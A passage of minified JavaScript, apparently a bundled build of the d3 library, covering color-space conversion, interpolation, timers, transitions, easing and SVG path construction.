this.rgb()+""}}),Wt(de,le,Kt(Ht,{brighter:function(t){return t=null==t?$t:Math.pow($t,t),new de(this.r*t,this.g*t,this.b*t,this.opacity)},darker:function(t){return t=null==t?Xt:Math.pow(Xt,t),new de(this.r*t,this.g*t,this.b*t,this.opacity)},rgb:function(){return this},displayable:function(){return 0<=this.r&&this.r<=255&&0<=this.g&&this.g<=255&&0<=this.b&&this.b<=255&&0<=this.opacity&&this.opacity<=1},toString:function(){var t=this.opacity;return(1===(t=isNaN(t)?1:Math.max(0,Math.min(1,t)))?"rgb(":"rgba(")+Math.max(0,Math.min(255,Math.round(this.r)||0))+", "+Math.max(0,Math.min(255,Math.round(this.g)||0))+", "+Math.max(0,Math.min(255,Math.round(this.b)||0))+(1===t?")":", "+t+")")}})),Wt(ge,ye,Kt(Ht,{brighter:function(t){return t=null==t?$t:Math.pow($t,t),new ge(this.h,this.s,this.l*t,this.opacity)},darker:function(t){return t=null==t?Xt:Math.pow(Xt,t),new ge(this.h,this.s,this.l*t,this.opacity)},rgb:function(){var t=this.h%360+360*(this.h<0),e=isNaN(t)||isNaN(this.s)?0:this.s,n=this.l,r=n+(n<.5?n:1-n)*e,i=2*n-r;return new de(ve(t>=240?t-240:t+120,i,r),ve(t,i,r),ve(t<120?t+240:t-120,i,r),this.opacity)},displayable:function(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1}}));var me=Math.PI/180,_e=180/Math.PI,be=.95047,we=1,xe=1.08883,ke=4/29,Me=6/29,Ee=3*Me*Me,Ae=Me*Me*Me;function Se(t){if(t instanceof Le)return new Le(t.l,t.a,t.b,t.opacity);if(t instanceof De){var e=t.h*me;return new Le(t.l,Math.cos(e)*t.c,Math.sin(e)*t.c,t.opacity)}t instanceof de||(t=fe(t));var n=Ge(t.r),r=Ge(t.g),i=Ge(t.b),o=Ne((.4124564*n+.3575761*r+.1804375*i)/be),a=Ne((.2126729*n+.7151522*r+.072175*i)/we);return new Le(116*a-16,500*(o-a),200*(a-Ne((.0193339*n+.119192*r+.9503041*i)/xe)),t.opacity)}function Le(t,e,n,r){this.l=+t,this.a=+e,this.b=+n,this.opacity=+r}function Ne(t){return t>Ae?Math.pow(t,1/3):t/Ee+ke}function Ce(t){return t>Me?t*t*t:Ee*(t-ke)}function Te(t){return 255*(t<=.0031308?12.92*t:1.055*Math.pow(t,1/2.4)-.055)}function Ge(t){return(t/=255)<=.04045?t/12.92:Math.pow((t+.055)/1.055,2.4)}function Ue(t,e,n,r){return 1===arguments.length?function(t){if(t instanceof De)return new De(t.h,t.c,t.l,t.opacity);t instanceof Le||(t=Se(t));var e=Math.atan2(t.b,t.a)*_e;return new De(e<0?e+360:e,Math.sqrt(t.a*t.a+t.b*t.b),t.l,t.opacity)}(t):new De(t,e,n,null==r?1:r)}function De(t,e,n,r){this.h=+t,this.c=+e,this.l=+n,this.opacity=+r}Wt(Le,(function(t,e,n,r){return 1===arguments.length?Se(t):new Le(t,e,n,null==r?1:r)}),Kt(Ht,{brighter:function(t){return new Le(this.l+18*(null==t?1:t),this.a,this.b,this.opacity)},darker:function(t){return new Le(this.l-18*(null==t?1:t),this.a,this.b,this.opacity)},rgb:function(){var t=(this.l+16)/116,e=isNaN(this.a)?t:t+this.a/500,n=isNaN(this.b)?t:t-this.b/200;return t=we*Ce(t),new de(Te(3.2404542*(e=be*Ce(e))-1.5371385*t-.4985314*(n=xe*Ce(n))),Te(-.969266*e+1.8760108*t+.041556*n),Te(.0556434*e-.2040259*t+1.0572252*n),this.opacity)}})),Wt(De,Ue,Kt(Ht,{brighter:function(t){return new De(this.h,this.c,this.l+18*(null==t?1:t),this.opacity)},darker:function(t){return new De(this.h,this.c,this.l-18*(null==t?1:t),this.opacity)},rgb:function(){return Se(this).rgb()}}));var Oe=-.14861,je=1.78277,ze=-.29227,Pe=-.90649,Ie=1.97294,Re=Ie*Pe,Fe=Ie*je,qe=je*ze-Pe*Oe;function Be(t,e,n,r){return 1===arguments.length?function(t){if(t instanceof Ye)return new Ye(t.h,t.s,t.l,t.opacity);t instanceof de||(t=fe(t));var e=t.r/255,n=t.g/255,r=t.b/255,i=(qe*r+Re*e-Fe*n)/(qe+Re-Fe),o=r-i,a=(Ie*(n-i)-ze*o)/Pe,u=Math.sqrt(a*a+o*o)/(Ie*i*(1-i)),c=u?Math.atan2(a,o)*_e-120:NaN;return new Ye(c<0?c+360:c,u,i,t.opacity)}(t):new Ye(t,e,n,null==r?1:r)}function Ye(t,e,n,r){this.h=+t,this.s=+e,this.l=+n,this.opacity=+r}function We(t,e,n,r,i){var o=t*t,a=o*t;return((1-3*t+3*o-a)*e+(4-6*o+3*a)*n+(1+3*t+3*o-3*a)*r+a*i)/6}function Ke(t){return function(){return t}}function He(t,e){return function(n){return t+n*e}}function Xe(t,e){var n=e-t;return n?He(t,n>180||n<-180?n-360*Math.round(n/360):n):Ke(isNaN(t)?e:t)}function $e(t,e){var n=e-t;return n?He(t,n):Ke(isNaN(t)?e:t)}Wt(Ye,Be,Kt(Ht,{brighter:function(t){return t=null==t?$t:Math.pow($t,t),new Ye(this.h,this.s,this.l*t,this.opacity)},darker:function(t){return t=null==t?Xt:Math.pow(Xt,t),new Ye(this.h,this.s,this.l*t,this.opacity)},rgb:function(){var t=isNaN(this.h)?0:(this.h+120)*me,e=+this.l,n=isNaN(this.s)?0:this.s*e*(1-e),r=Math.cos(t),i=Math.sin(t);return new de(255*(e+n*(Oe*r+je*i)),255*(e+n*(ze*r+Pe*i)),255*(e+n*(Ie*r)),this.opacity)}}));const Ve=function t(e){var n=function(t){return 1==(t=+t)?$e:function(e,n){return n-e?function(t,e,n){return t=Math.pow(t,n),e=Math.pow(e,n)-t,n=1/n,function(r){return Math.pow(t+r*e,n)}}(e,n,t):Ke(isNaN(e)?n:e)}}(e);function r(t,e){var r=n((t=le(t)).r,(e=le(e)).r),i=n(t.g,e.g),o=n(t.b,e.b),a=$e(t.opacity,e.opacity);return function(e){return t.r=r(e),t.g=i(e),t.b=o(e),t.opacity=a(e),t+""}}return r.gamma=t,r}(1);function Ze(t){return function(e){var n,r,i=e.length,o=new Array(i),a=new Array(i),u=new Array(i);for(n=0;n<i;++n)r=le(e[n]),o[n]=r.r||0,a[n]=r.g||0,u[n]=r.b||0;return o=t(o),a=t(a),u=t(u),r.opacity=1,function(t){return r.r=o(t),r.g=a(t),r.b=u(t),r+""}}}function Je(t,e){return e-=t=+t,function(n){return t+e*n}}Ze((function(t){var e=t.length-1;return function(n){var r=n<=0?n=0:n>=1?(n=1,e-1):Math.floor(n*e),i=t[r],o=t[r+1],a=r>0?t[r-1]:2*i-o,u=r<e-1?t[r+2]:2*o-i;return We((n-r/e)*e,a,i,o,u)}})),Ze((function(t){var e=t.length;return function(n){var r=Math.floor(((n%=1)<0?++n:n)*e),i=t[(r+e-1)%e],o=t[r%e],a=t[(r+1)%e],u=t[(r+2)%e];return We((n-r/e)*e,i,o,a,u)}}));var Qe=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,tn=new RegExp(Qe.source,"g");function en(t,e){var n,r,i,o=Qe.lastIndex=tn.lastIndex=0,a=-1,u=[],c=[];for(t+="",e+="";(n=Qe.exec(t))&&(r=tn.exec(e));)(i=r.index)>o&&(i=e.slice(o,i),u[a]?u[a]+=i:u[++a]=i),(n=n[0])===(r=r[0])?u[a]?u[a]+=r:u[++a]=r:(u[++a]=null,c.push({i:a,x:Je(n,r)})),o=tn.lastIndex;return o<e.length&&(i=e.slice(o),u[a]?u[a]+=i:u[++a]=i),u.length<2?c[0]?function(t){return function(e){return t(e)+""}}(c[0].x):function(t){return function(){return t}}(e):(e=c.length,function(t){for(var n,r=0;r<e;++r)u[(n=c[r]).i]=n.x(t);return u.join("")})}var nn,rn,on,an,un=180/Math.PI,cn={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function sn(t,e,n,r,i,o){var a,u,c;return(a=Math.sqrt(t*t+e*e))&&(t/=a,e/=a),(c=t*n+e*r)&&(n-=t*c,r-=e*c),(u=Math.sqrt(n*n+r*r))&&(n/=u,r/=u,c/=u),t*r<e*n&&(t=-t,e=-e,c=-c,a=-a),{translateX:i,translateY:o,rotate:Math.atan2(e,t)*un,skewX:Math.atan(c)*un,scaleX:a,scaleY:u}}function hn(t,e,n,r){function i(t){return t.length?t.pop()+" ":""}return function(o,a){var u=[],c=[];return o=t(o),a=t(a),function(t,r,i,o,a,u){if(t!==i||r!==o){var c=a.push("translate(",null,e,null,n);u.push({i:c-4,x:Je(t,i)},{i:c-2,x:Je(r,o)})}else(i||o)&&a.push("translate("+i+e+o+n)}(o.translateX,o.translateY,a.translateX,a.translateY,u,c),function(t,e,n,o){t!==e?(t-e>180?e+=360:e-t>180&&(t+=360),o.push({i:n.push(i(n)+"rotate(",null,r)-2,x:Je(t,e)})):e&&n.push(i(n)+"rotate("+e+r)}(o.rotate,a.rotate,u,c),function(t,e,n,o){t!==e?o.push({i:n.push(i(n)+"skewX(",null,r)-2,x:Je(t,e)}):e&&n.push(i(n)+"skewX("+e+r)}(o.skewX,a.skewX,u,c),function(t,e,n,r,o,a){if(t!==n||e!==r){var u=o.push(i(o)+"scale(",null,",",null,")");a.push({i:u-4,x:Je(t,n)},{i:u-2,x:Je(e,r)})}else 1===n&&1===r||o.push(i(o)+"scale("+n+","+r+")")}(o.scaleX,o.scaleY,a.scaleX,a.scaleY,u,c),o=a=null,function(t){for(var e,n=-1,r=c.length;++n<r;)u[(e=c[n]).i]=e.x(t);return u.join("")}}}var fn=hn((function(t){return"none"===t?cn:(nn||(nn=document.createElement("DIV"),rn=document.documentElement,on=document.defaultView),nn.style.transform=t,t=on.getComputedStyle(rn.appendChild(nn),null).getPropertyValue("transform"),rn.removeChild(nn),sn(+(t=t.slice(7,-1).split(","))[0],+t[1],+t[2],+t[3],+t[4],+t[5]))}),"px, ","px)","deg)"),ln=hn((function(t){return null==t?cn:(an||(an=document.createElementNS("http://www.w3.org/2000/svg","g")),an.setAttribute("transform",t),(t=an.transform.baseVal.consolidate())?sn((t=t.matrix).a,t.b,t.c,t.d,t.e,t.f):cn)}),", ",")",")"),dn=Math.SQRT2;function pn(t){return((t=Math.exp(t))+1/t)/2}function yn(t,e){var n,r,i=t[0],o=t[1],a=t[2],u=e[0],c=e[1],s=e[2],h=u-i,f=c-o,l=h*h+f*f;if(l<1e-12)r=Math.log(s/a)/dn,n=function(t){return[i+t*h,o+t*f,a*Math.exp(dn*t*r)]};else{var d=Math.sqrt(l),p=(s*s-a*a+4*l)/(2*a*2*d),y=(s*s-a*a-4*l)/(2*s*2*d),g=Math.log(Math.sqrt(p*p+1)-p),v=Math.log(Math.sqrt(y*y+1)-y);r=(v-g)/dn,n=function(t){var e,n=t*r,u=pn(g),c=a/(2*d)*(u*(e=dn*n+g,((e=Math.exp(2*e))-1)/(e+1))-function(t){return((t=Math.exp(t))-1/t)/2}(g));return[i+c*h,o+c*f,a*u/pn(dn*n+g)]}}return n.duration=1e3*r,n}function gn(t){return function(e,n){var r=t((e=ye(e)).h,(n=ye(n)).h),i=$e(e.s,n.s),o=$e(e.l,n.l),a=$e(e.opacity,n.opacity);return function(t){return e.h=r(t),e.s=i(t),e.l=o(t),e.opacity=a(t),e+""}}}function vn(t){return function(e,n){var r=t((e=Ue(e)).h,(n=Ue(n)).h),i=$e(e.c,n.c),o=$e(e.l,n.l),a=$e(e.opacity,n.opacity);return function(t){return e.h=r(t),e.c=i(t),e.l=o(t),e.opacity=a(t),e+""}}}function mn(t){return function e(n){function r(e,r){var i=t((e=Be(e)).h,(r=Be(r)).h),o=$e(e.s,r.s),a=$e(e.l,r.l),u=$e(e.opacity,r.opacity);return function(t){return e.h=i(t),e.s=o(t),e.l=a(Math.pow(t,n)),e.opacity=u(t),e+""}}return n=+n,r.gamma=e,r}(1)}gn(Xe),gn($e),vn(Xe),vn($e),mn(Xe);var _n,bn,wn=mn($e),xn=0,kn=0,Mn=0,En=1e3,An=0,Sn=0,Ln=0,Nn="object"==typeof performance&&performance.now?performance:Date,Cn="object"==typeof window&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(t){setTimeout(t,17)};function Tn(){return Sn||(Cn(Gn),Sn=Nn.now()+Ln)}function Gn(){Sn=0}function Un(){this._call=this._time=this._next=null}function Dn(t,e,n){var r=new Un;return r.restart(t,e,n),r}function On(){Sn=(An=Nn.now())+Ln,xn=kn=0;try{!function(){Tn(),++xn;for(var t,e=_n;e;)(t=Sn-e._time)>=0&&e._call.call(null,t),e=e._next;--xn}()}finally{xn=0,function(){for(var t,e,n=_n,r=1/0;n;)n._call?(r>n._time&&(r=n._time),t=n,n=n._next):(e=n._next,n._next=null,n=t?t._next=e:_n=e);bn=t,zn(r)}(),Sn=0}}function jn(){var t=Nn.now(),e=t-An;e>En&&(Ln-=e,An=t)}function zn(t){xn||(kn&&(kn=clearTimeout(kn)),t-Sn>24?(t<1/0&&(kn=setTimeout(On,t-Nn.now()-Ln)),Mn&&(Mn=clearInterval(Mn))):(Mn||(An=Nn.now(),Mn=setInterval(jn,En)),xn=1,Cn(On)))}function Pn(t,e,n){var r=new Un;return e=null==e?0:+e,r.restart((function(n){r.stop(),t(n+e)}),e,n),r}Un.prototype=Dn.prototype={constructor:Un,restart:function(t,e,n){if("function"!=typeof t)throw new TypeError("callback is not a function");n=(null==n?Tn():+n)+(null==e?0:+e),this._next||bn===this||(bn?bn._next=this:_n=this,bn=this),this._call=t,this._time=n,zn()},stop:function(){this._call&&(this._call=null,this._time=1/0,zn())}};var In=p("start","end","interrupt"),Rn=[],Fn=0,qn=2;function Bn(t,e,n,r,i,o){var a=t.__transition;if(a){if(n in a)return}else t.__transition={};!function(t,e,n){var r,i=t.__transition;function o(c){var s,h,f,l;if(1!==n.state)return u();for(s in i)if((l=i[s]).name===n.name){if(3===l.state)return Pn(o);4===l.state?(l.state=6,l.timer.stop(),l.on.call("interrupt",t,t.__data__,l.index,l.group),delete i[s]):+s<e&&(l.state=6,l.timer.stop(),delete i[s])}if(Pn((function(){3===n.state&&(n.state=4,n.timer.restart(a,n.delay,n.time),a(c))})),n.state=qn,n.on.call("start",t,t.__data__,n.index,n.group),n.state===qn){for(n.state=3,r=new Array(f=n.tween.length),s=0,h=-1;s<f;++s)(l=n.tween[s].value.call(t,t.__data__,n.index,n.group))&&(r[++h]=l);r.length=h+1}}function a(e){for(var i=e<n.duration?n.ease.call(null,e/n.duration):(n.timer.restart(u),n.state=5,1),o=-1,a=r.length;++o<a;)r[o].call(null,i);5===n.state&&(n.on.call("end",t,t.__data__,n.index,n.group),u())}function u(){for(var r in n.state=6,n.timer.stop(),delete i[e],i)return;delete t.__transition}i[e]=n,n.timer=Dn((function(t){n.state=1,n.timer.restart(o,n.delay,n.time),n.delay<=t&&o(t-n.delay)}),0,n.time)}(t,n,{name:e,index:r,group:i,on:In,tween:Rn,time:o.time,delay:o.delay,duration:o.duration,ease:o.ease,timer:null,state:Fn})}function Yn(t,e){var n=Kn(t,e);if(n.state>Fn)throw new Error("too late; already scheduled");return n}function Wn(t,e){var n=Kn(t,e);if(n.state>qn)throw new Error("too late; already started");return n}function Kn(t,e){var n=t.__transition;if(!n||!(n=n[e]))throw new Error("transition not found");return n}function Hn(t,e){var n,r,i,o=t.__transition,a=!0;if(o){for(i in e=null==e?null:e+"",o)(n=o[i]).name===e?(r=n.state>qn&&n.state<5,n.state=6,n.timer.stop(),r&&n.on.call("interrupt",t,t.__data__,n.index,n.group),delete o[i]):a=!1;a&&delete t.__transition}}function Xn(t,e){var n,r;return function(){var i=Wn(this,t),o=i.tween;if(o!==n)for(var a=0,u=(r=n=o).length;a<u;++a)if(r[a].name===e){(r=r.slice()).splice(a,1);break}i.tween=r}}function $n(t,e,n){var r,i;if("function"!=typeof n)throw new Error;return function(){var o=Wn(this,t),a=o.tween;if(a!==r){i=(r=a).slice();for(var u={name:e,value:n},c=0,s=i.length;c<s;++c)if(i[c].name===e){i[c]=u;break}c===s&&i.push(u)}o.tween=i}}function Vn(t,e,n){var r=t._id;return t.each((function(){var t=Wn(this,r);(t.value||(t.value={}))[e]=n.apply(this,arguments)})),function(t){return Kn(t,r).value[e]}}function Zn(t,e){var n;return("number"==typeof e?Je:e instanceof ce?Ve:(n=ce(e))?(e=n,Ve):en)(t,e)}function Jn(t){return function(){this.removeAttribute(t)}}function Qn(t){return function(){this.removeAttributeNS(t.space,t.local)}}function tr(t,e,n){var r,i;return function(){var o=this.getAttribute(t);return o===n?null:o===r?i:i=e(r=o,n)}}function er(t,e,n){var r,i;return function(){var o=this.getAttributeNS(t.space,t.local);return o===n?null:o===r?i:i=e(r=o,n)}}function nr(t,e,n){var r,i,o;return function(){var a,u=n(this);if(null!=u)return(a=this.getAttribute(t))===u?null:a===r&&u===i?o:o=e(r=a,i=u);this.removeAttribute(t)}}function rr(t,e,n){var r,i,o;return function(){var a,u=n(this);if(null!=u)return(a=this.getAttributeNS(t.space,t.local))===u?null:a===r&&u===i?o:o=e(r=a,i=u);this.removeAttributeNS(t.space,t.local)}}function ir(t,e){function n(){var n=this,r=e.apply(n,arguments);return r&&function(e){n.setAttributeNS(t.space,t.local,r(e))}}return n._value=e,n}function or(t,e){function n(){var n=this,r=e.apply(n,arguments);return r&&function(e){n.setAttribute(t,r(e))}}return n._value=e,n}function ar(t,e){return function(){Yn(this,t).delay=+e.apply(this,arguments)}}function ur(t,e){return e=+e,function(){Yn(this,t).delay=e}}function cr(t,e){return function(){Wn(this,t).duration=+e.apply(this,arguments)}}function sr(t,e){return e=+e,function(){Wn(this,t).duration=e}}var hr=St.prototype.constructor,fr=0;function lr(t,e,n,r){this._groups=t,this._parents=e,this._name=n,this._id=r}function dr(){return++fr}var pr=St.prototype;lr.prototype=function(t){return St().transition(t)}.prototype={constructor:lr,select:function(t){var e=this._name,n=this._id;"function"!=typeof t&&(t=x(t));for(var r=this._groups,i=r.length,o=new Array(i),a=0;a<i;++a)for(var u,c,s=r[a],h=s.length,f=o[a]=new Array(h),l=0;l<h;++l)(u=s[l])&&(c=t.call(u,u.__data__,l,s))&&("__data__"in u&&(c.__data__=u.__data__),f[l]=c,Bn(f[l],e,n,l,f,Kn(u,n)));return new lr(o,this._parents,e,n)},selectAll:function(t){var e=this._name,n=this._id;"function"!=typeof t&&(t=M(t));for(var r=this._groups,i=r.length,o=[],a=[],u=0;u<i;++u)for(var c,s=r[u],h=s.length,f=0;f<h;++f)if(c=s[f]){for(var l,d=t.call(c,c.__data__,f,s),p=Kn(c,n),y=0,g=d.length;y<g;++y)(l=d[y])&&Bn(l,e,n,y,d,p);o.push(d),a.push(c)}return new lr(o,a,e,n)},filter:function(t){"function"!=typeof t&&(t=L(t));for(var e=this._groups,n=e.length,r=new Array(n),i=0;i<n;++i)for(var o,a=e[i],u=a.length,c=r[i]=[],s=0;s<u;++s)(o=a[s])&&t.call(o,o.__data__,s,a)&&c.push(o);return new lr(r,this._parents,this._name,this._id)},merge:function(t){if(t._id!==this._id)throw new Error;for(var e=this._groups,n=t._groups,r=e.length,i=n.length,o=Math.min(r,i),a=new Array(r),u=0;u<o;++u)for(var c,s=e[u],h=n[u],f=s.length,l=a[u]=new Array(f),d=0;d<f;++d)(c=s[d]||h[d])&&(l[d]=c);for(;u<r;++u)a[u]=e[u];return new lr(a,this._parents,this._name,this._id)},selection:function(){return new hr(this._groups,this._parents)},transition:function(){for(var t=this._name,e=this._id,n=dr(),r=this._groups,i=r.length,o=0;o<i;++o)for(var a,u=r[o],c=u.length,s=0;s<c;++s)if(a=u[s]){var h=Kn(a,e);Bn(a,t,n,s,u,{time:h.time+h.delay+h.duration,delay:0,duration:h.duration,ease:h.ease})}return new lr(r,this._parents,t,n)},call:pr.call,nodes:pr.nodes,node:pr.node,size:pr.size,empty:pr.empty,each:pr.each,on:function(t,e){var n=this._id;return arguments.length<2?Kn(this.node(),n).on.on(t):this.each(function(t,e,n){var r,i,o=function(t){return(t+"").trim().split(/^|\s+/).every((function(t){var e=t.indexOf(".");return e>=0&&(t=t.slice(0,e)),!t||"start"===t}))}(e)?Yn:Wn;return function(){var a=o(this,t),u=a.on;u!==r&&(i=(r=u).copy()).on(e,n),a.on=i}}(n,t,e))},attr:function(t,e){var n=v(t),r="transform"===n?ln:Zn;return this.attrTween(t,"function"==typeof e?(n.local?rr:nr)(n,r,Vn(this,"attr."+t,e)):null==e?(n.local?Qn:Jn)(n):(n.local?er:tr)(n,r,e+""))},attrTween:function(t,e){var n="attr."+t;if(arguments.length<2)return(n=this.tween(n))&&n._value;if(null==e)return this.tween(n,null);if("function"!=typeof e)throw new Error;var r=v(t);return this.tween(n,(r.local?ir:or)(r,e))},style:function(t,e,n){var r="transform"==(t+="")?fn:Zn;return null==e?this.styleTween(t,function(t,e){var n,r,i;return function(){var o=Y(this,t),a=(this.style.removeProperty(t),Y(this,t));return o===a?null:o===n&&a===r?i:i=e(n=o,r=a)}}(t,r)).on("end.style."+t,function(t){return function(){this.style.removeProperty(t)}}(t)):this.styleTween(t,"function"==typeof e?function(t,e,n){var r,i,o;return function(){var a=Y(this,t),u=n(this);return null==u&&(this.style.removeProperty(t),u=Y(this,t)),a===u?null:a===r&&u===i?o:o=e(r=a,i=u)}}(t,r,Vn(this,"style."+t,e)):function(t,e,n){var r,i;return function(){var o=Y(this,t);return o===n?null:o===r?i:i=e(r=o,n)}}(t,r,e+""),n)},styleTween:function(t,e,n){var r="style."+(t+="");if(arguments.length<2)return(r=this.tween(r))&&r._value;if(null==e)return this.tween(r,null);if("function"!=typeof e)throw new Error;return this.tween(r,function(t,e,n){function r(){var r=this,i=e.apply(r,arguments);return i&&function(e){r.style.setProperty(t,i(e),n)}}return r._value=e,r}(t,e,null==n?"":n))},text:function(t){return this.tween("text","function"==typeof t?function(t){return function(){var e=t(this);this.textContent=null==e?"":e}}(Vn(this,"text",t)):function(t){return function(){this.textContent=t}}(null==t?"":t+""))},remove:function(){return this.on("end.remove",function(t){return function(){var e=this.parentNode;for(var n in this.__transition)if(+n!==t)return;e&&e.removeChild(this)}}(this._id))},tween:function(t,e){var n=this._id;if(t+="",arguments.length<2){for(var r,i=Kn(this.node(),n).tween,o=0,a=i.length;o<a;++o)if((r=i[o]).name===t)return r.value;return null}return this.each((null==e?Xn:$n)(n,t,e))},delay:function(t){var e=this._id;return arguments.length?this.each(("function"==typeof t?ar:ur)(e,t)):Kn(this.node(),e).delay},duration:function(t){var e=this._id;return arguments.length?this.each(("function"==typeof t?cr:sr)(e,t)):Kn(this.node(),e).duration},ease:function(t){var e=this._id;return arguments.length?this.each(function(t,e){if("function"!=typeof e)throw new Error;return function(){Wn(this,t).ease=e}}(e,t)):Kn(this.node(),e).ease}},function t(e){function n(t){return Math.pow(t,e)}return e=+e,n.exponent=t,n}(3),function t(e){function n(t){return 1-Math.pow(1-t,e)}return e=+e,n.exponent=t,n}(3),function t(e){function n(t){return((t*=2)<=1?Math.pow(t,e):2-Math.pow(2-t,e))/2}return e=+e,n.exponent=t,n}(3),Math.PI;var yr=1.70158,gr=(function t(e){function n(t){return t*t*((e+1)*t-e)}return e=+e,n.overshoot=t,n}(yr),function t(e){function n(t){return--t*t*((e+1)*t+e)+1}return e=+e,n.overshoot=t,n}(yr),function t(e){function n(t){return((t*=2)<1?t*t*((e+1)*t-e):(t-=2)*t*((e+1)*t+e)+2)/2}return e=+e,n.overshoot=t,n}(yr),2*Math.PI),vr=(function t(e,n){var r=Math.asin(1/(e=Math.max(1,e)))*(n/=gr);function i(t){return e*Math.pow(2,10*--t)*Math.sin((r-t)/n)}return i.amplitude=function(e){return t(e,n*gr)},i.period=function(n){return t(e,n)},i}(1,.3),function t(e,n){var r=Math.asin(1/(e=Math.max(1,e)))*(n/=gr);function i(t){return 1-e*Math.pow(2,-10*(t=+t))*Math.sin((t+r)/n)}return i.amplitude=function(e){return t(e,n*gr)},i.period=function(n){return t(e,n)},i}(1,.3),function t(e,n){var r=Math.asin(1/(e=Math.max(1,e)))*(n/=gr);function i(t){return((t=2*t-1)<0?e*Math.pow(2,10*t)*Math.sin((r-t)/n):2-e*Math.pow(2,-10*t)*Math.sin((r+t)/n))/2}return i.amplitude=function(e){return t(e,n*gr)},i.period=function(n){return t(e,n)},i}(1,.3),{time:null,delay:0,duration:250,ease:function(t){return((t*=2)<=1?t*t*t:(t-=2)*t*t+2)/2}});function mr(t,e){for(var n;!(n=t.__transition)||!(n=n[e]);)if(!(t=t.parentNode))return vr.time=Tn(),vr;return n}function _r(t){return{type:t}}function br(t,e){return t<e?-1:t>e?1:t>=e?0:NaN}St.prototype.interrupt=function(t){return this.each((function(){Hn(this,t)}))},St.prototype.transition=function(t){var e,n;t instanceof lr?(e=t._id,t=t._name):(e=dr(),(n=vr).time=Tn(),t=null==t?null:t+"");for(var r=this._groups,i=r.length,o=0;o<i;++o)for(var a,u=r[o],c=u.length,s=0;s<c;++s)(a=u[s])&&Bn(a,t,e,s,u,n||mr(a,e));return new lr(r,this._parents,t,e)},["e","w"].map(_r),["n","s"].map(_r),["n","e","s","w","nw","ne","se","sw"].map(_r);var wr=function(t){return 1===t.length&&(t=function(t){return function(e,n){return br(t(e),n)}}(t)),{left:function(e,n,r,i){for(null==r&&(r=0),null==i&&(i=e.length);r<i;){var o=r+i>>>1;t(e[o],n)<0?r=o+1:i=o}return r},right:function(e,n,r,i){for(null==r&&(r=0),null==i&&(i=e.length);r<i;){var o=r+i>>>1;t(e[o],n)>0?i=o:r=o+1}return r}}}(br);wr.right,wr.left;var xr=Array.prototype;xr.slice,xr.map,Math.sqrt(50),Math.sqrt(10),Math.sqrt(2),Math.cos,Math.sin,Math.PI,Math.max,Array.prototype.slice;var kr=Math.PI,Mr=2*kr,Er=1e-6,Ar=Mr-Er;function Sr(){this._x0=this._y0=this._x1=this._y1=null,this._=""}Sr.prototype=function(){return new Sr}.prototype={constructor:Sr,moveTo:function(t,e){this._+="M"+(this._x0=this._x1=+t)+","+(this._y0=this._y1=+e)},closePath:function(){null!==this._x1&&(this._x1=this._x0,this._y1=this._y0,this._+="Z")},lineTo:function(t,e){this._+="L"+(this._x1=+t)+","+(this._y1=+e)},quadraticCurveTo:function(t,e,n,r){this._+="Q"+ +t+","+ +e+","+(this._x1=+n)+","+(this._y1=+r)},bezierCurveTo:function(t,e,n,r,i,o){this._+="C"+ +t+","+ +e+","+ +n+","+ +r+","+(this._x1=+i)+","+(this._y1=+o)},arcTo:function(t,e,n,r,i){t=+t,e=+e,n=+n,r=+r,i=+i;var o=this._x1,a=this._y1,u=n-t,c=r-e,s=o-t,h=a-e,f=s*s+h*h;if(i<0)throw new Error("negative radius: "+i);if(null===this._x1)this._+="M"+(this._x1=t)+","+(this._y1=e);else if(f>Er)if(Math.abs(h*u-c*s)>Er&&i){var l=n-o,d=r-a,p=u*u+c*c,y=l*l+d*d,g=Math.sqrt(p),v=Math.sqrt(f),m=i*Math.tan((kr-Math.acos((p+f-y)/(2*g*v)))/2),_=m/v,b=m/g;Math.abs(_-1)>Er&&(this._+="L"+(t+_*s)+","+(e+_*h)),this._+="A"+i+","+i+",0,0,"+ +(h*l>s*d)+","+(this._x1=t+b*u)+","+(this._y1=e+b*c)}else this._+="L"+(this._x1=t)+","+(this._y1=e)},arc:function(t,e,n,r,i,o){t=+t,e=+e;var a=(n=+n)*Math.cos(r),u=n*Math.sin(r),c=t+a,s=e+u,h=1^o,f=o?r-i:i-r;if(n<0)throw new Error("negative radius: "+n);null===this._x1?this._+="M"+c+","+s:(Math.abs(this._x1-c)>Er||Math.abs(this._y1-s)>Er)&&(this._+="L"+c+","+s),n&&(f<0&&(f=f%Mr+Mr),f>Ar?this._+="A"+n+","+n+",0,1,"+h+","+(t-a)+","+(e-u)+"A"+n+","+n+",0,1,"+h+","+(this._x1=c)+","+(this._y1=s):f>Er&&(this._+="A"+n+","+n+",0,"+ +(f>=kr)+","+h+","+(this._x1=t+n*Math.cos(i))+","+(this._y1=e+n*Math.sin(i))))},rect:function(t,e,n,r){this._+="M"+(this._x0=this._x1=+t)+","+(this._y0=this._y1=+e)+"h"+ +n+"v"+ +r+"h"+-n+"Z"},toString:function(){return this._}};var Lr="$";function Nr(){}function Cr(t,e){var n=new Nr;if(t instanceof Nr)t.each((function(t,e){n.set(e,t)}));else if(Array.isArray(t)){var r,i=-1,o=t.length;if(null==e)for(;++i<o;)n.set(i,t[i]);else for(;++i<o;)n.set(e(r=t[i],i,t),r)}else if(t)for(var a in t)n.set(a,t[a]);return n}Nr.prototype=Cr.prototype={constructor:Nr,has:function(t){return Lr+t in this},get:function(t){return this[Lr+t]},set:function(t,e){return this[Lr+t]=e,this},remove:function(t){var e=Lr+t;return e in this&&delete this[e]},clear:function(){for(var t in this)t[0]===Lr&&delete this[t]},keys:function(){var t=[];for(var e in this)e[0]===Lr&&t.push(e.slice(1));return t},values:function(){var t=[];for(var e in this)e[0]===Lr&&t.push(this[e]);return t},entries:function(){var t=[];for(var e in this)e[0]===Lr&&t.push({key:e.slice(1),value:this[e]});return t},size:function(){var t=0;for(var e in this)e[0]===Lr&&++t;return t},empty:function(){for(var t in this)if(t[0]===Lr)return!1;return!0},each:function(t){for(var e in this)e[0]===Lr&&t(this[e],e.slice(1),this)}};const Tr=Cr;function Gr(){}var Ur=Tr.prototype;Gr.prototype=function(t,e){var n=new Gr;if(t instanceof Gr)t.each((function(t){n.add(t)}));else if(t){var r=-1,i=t.length;if(null==e)for(;++r<i;)n.add(t[r]);else for(;++r<i;)n.add(e(t[r],r,t))}return n}.prototype={constructor:Gr,has:Ur.has,add:function(t){return 